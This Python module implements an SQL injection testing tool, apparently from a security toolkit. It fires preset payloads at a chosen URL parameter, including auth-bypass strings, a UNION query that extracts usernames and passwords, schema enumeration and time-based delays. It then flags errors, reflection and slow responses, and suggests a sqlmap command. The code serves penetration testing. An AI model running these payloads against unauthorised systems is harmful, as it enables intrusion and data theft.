"""Interactive SQL injection probe helper."""

from __future__ import annotations

import json
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Dict, Iterable, List, Optional, Sequence, Tuple

from ..base import ToolResult

_DEFAULT_HEADERS = {
    "User-Agent": "Cryptea/SQLiTester",
    "Accept": "*/*",
}

_ERROR_SIGNATURES: Sequence[str] = (
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "sqlstate",
    "syntax error",
    "odbc",
    "ora-00933",
    "oracle error",
    "mysql_fetch",
    "psql:error",
    "invalid query",
)

PAYLOAD_PRESETS: Dict[str, Sequence[str]] = {
    "basic": (
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR 'a'='a",
        "') OR ('a'='a",
    ),
    "error-based": (
        "'",
        "\"",
        "' ORDER BY 999--",
        "' UNION SELECT null--",
    ),
    "union": (
        "' UNION SELECT username, password FROM users--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "') UNION SELECT table_name, column_name FROM information_schema.columns--",
    ),
    "time": (
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
    ),
}


@dataclass(slots=True)
class _ProbeResult:
    payload: str
    status: int
    duration: float
    response_size: int
    errors: List[str]
    reflected: bool
    transport_error: Optional[str]


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):  # type: ignore[override]
        return None


class SQLInjectionTester:
    name = "SQLi Tester"
    description = "Send crafted SQL payloads and surface potential injection signals."
    category = "Web"

    def run(
        self,
        target: str,
        parameter: str = "",
        method: str = "GET",
        body: str = "",
        cookies: str = "",
        headers: str = "",
        payload_profile: str = "basic",
        custom_payloads: str = "",
        follow_redirects: str = "true",
        timeout: str = "8",
        include_sqlmap_hint: str = "true",
    ) -> ToolResult:
        target = target.strip()
        if not target:
            raise ValueError("Target URL is required")

        timeout_val = max(float(timeout or 8), 1.0)
        follow = follow_redirects.strip().lower() in {"1", "true", "yes", "on"}

        payloads = list(PAYLOAD_PRESETS.get(payload_profile, ()))
        payloads.extend(_split_custom_payloads(custom_payloads))
        if not payloads:
            raise ValueError("No payloads selected")

        method = (method or "GET").upper()
        if method not in {"GET", "POST", "PUT", "PATCH", "DELETE"}:
            method = "GET"

        parsed = urllib.parse.urlsplit(target)
        params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        chosen_param = parameter.strip() or (params[0][0] if params else "id")

        opener = self._build_opener(follow)
        request_headers = self._parse_headers(headers)
        final_headers = {**_DEFAULT_HEADERS, **request_headers}
        if cookies:
            final_headers["Cookie"] = cookies.strip()

        baseline = self._send_probe(
            opener=opener,
            method=method,
            target=target,
            parameter=chosen_param,
            payload="",
            body_template=body,
            headers=final_headers,
            timeout=timeout_val,
        )

        results: List[_ProbeResult] = []
        for payload in payloads:
            probe = self._send_probe(
                opener=opener,
                method=method,
                target=target,
                parameter=chosen_param,
                payload=payload,
                body_template=body,
                headers=final_headers,
                timeout=timeout_val,
            )
            if baseline.transport_error and not probe.transport_error:
                baseline = _ProbeResult("", probe.status, probe.duration, probe.response_size, [], False, None)
            results.append(probe)

        body_lines = [
            f"Target: {target}",
            f"Method: {method}",
            f"Parameter: {chosen_param}",
            "",
            "Payload results:",
        ]

        for probe in results:
            status = probe.status if probe.status else 0
            marker = []
            if probe.errors:
                marker.append("errors:" + ",".join(probe.errors))
            if probe.reflected:
                marker.append("reflected")
            if baseline.duration and probe.duration - baseline.duration >= 3.5:
                marker.append("slow response")
            if probe.transport_error:
                marker.append(f"transport:{probe.transport_error}")
            markers = f" ({'; '.join(marker)})" if marker else ""
            body_lines.append(
                f"- {probe.payload!r} -> status {status}, {probe.duration:.2f}s, {probe.response_size} bytes{markers}"
            )

        if include_sqlmap_hint.strip().lower() in {"1", "true", "yes", "on"}:
            hint = self._build_sqlmap_hint(target, chosen_param, method, body)
            if hint:
                body_lines.extend(["", "Quick sqlmap command:", hint])

        return ToolResult(title=f"SQLi tester: {target}", body="\n".join(body_lines))

    def _build_opener(self, follow_redirects: bool) -> urllib.request.OpenerDirector:
        handlers: List[urllib.request.BaseHandler] = []
        if not follow_redirects:
            handlers.append(_NoRedirect())
        return urllib.request.build_opener(*handlers)

    def _send_probe(
        self,
        opener: urllib.request.OpenerDirector,
        target: str,
        method: str,
        parameter: str,
        payload: str,
        body_template: str,
        headers: Dict[str, str],
        timeout: float,
    ) -> _ProbeResult:
        url, data = self._apply_payload(target, method, parameter, payload, body_template)
        request = urllib.request.Request(url=url, data=data, method=method)
        for key, value in headers.items():
            request.add_header(key, value)
        start = time.monotonic()
        response_body = b""
        status = 0
        transport_error: Optional[str] = None
        try:
            with opener.open(request, timeout=timeout) as resp:
                status = getattr(resp, "status", getattr(resp, "code", 0))
                response_body = resp.read(65536)
        except urllib.error.HTTPError as exc:
            status = exc.code
            try:
                response_body = exc.read(65536)
            except Exception:
                response_body = b""
        except urllib.error.URLError as exc:
            transport_error = getattr(exc.reason, "strerror", str(exc.reason))
        except Exception as exc:  # pragma: no cover - network failures vary
            transport_error = str(exc)
        duration = time.monotonic() - start
        text = response_body.decode("utf-8", errors="replace")
        errors = [sig for sig in _ERROR_SIGNATURES if sig in text.lower()]
        reflected = bool(payload and (payload in text))
        return _ProbeResult(
            payload=payload,
            status=status,
            duration=duration,
            response_size=len(response_body),
            errors=errors,
            reflected=reflected,
            transport_error=transport_error,
        )

    def _apply_payload(
        self,
        target: str,
        method: str,
        parameter: str,
        payload: str,
        body_template: str,
    ) -> Tuple[str, Optional[bytes]]:
        parsed = urllib.parse.urlsplit(target)
        query = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        if method == "GET":
            replaced = False
            for idx, (key, value) in enumerate(query):
                if key == parameter:
                    query[idx] = (key, payload)
                    replaced = True
                    break
            if not replaced:
                query.append((parameter, payload))
            new_query = urllib.parse.urlencode(query)
            rebuilt = parsed._replace(query=new_query)
            return urllib.parse.urlunsplit(rebuilt), None
        if body_template.strip().startswith("{"):
            try:
                parsed_body = json.loads(body_template) if body_template.strip() else {}
            except json.JSONDecodeError:
                parsed_body = {}
            parsed_body[parameter] = payload
            data = json.dumps(parsed_body).encode("utf-8")
        else:
            pairs = urllib.parse.parse_qsl(body_template, keep_blank_values=True)
            replaced = False
            for idx, (key, value) in enumerate(pairs):
                if key == parameter:
                    pairs[idx] = (key, payload)
                    replaced = True
                    break
            if not replaced:
                pairs.append((parameter, payload))
            data = urllib.parse.urlencode(pairs).encode("utf-8")
        return target, data

    def _build_sqlmap_hint(self, target: str, parameter: str, method: str, body_template: str) -> str:
        parts = ["sqlmap", "-u", f"{target}", "-p", parameter, "--batch"]
        if method != "GET":
            parts += ["--method", method]
        if body_template.strip():
            parts += ["--data", body_template]
        return " ".join(parts)

    def _parse_headers(self, header_blob: str) -> Dict[str, str]:
        headers: Dict[str, str] = {}
        for line in header_blob.splitlines():
            if not line.strip() or ":" not in line:
                continue
            key, value = line.split(":", 1)
            headers[key.strip()] = value.strip()
        return headers


def _split_custom_payloads(blob: str) -> Iterable[str]:
    for line in blob.splitlines():
        candidate = line.strip()
        if not candidate:
            continue
        yield candidate
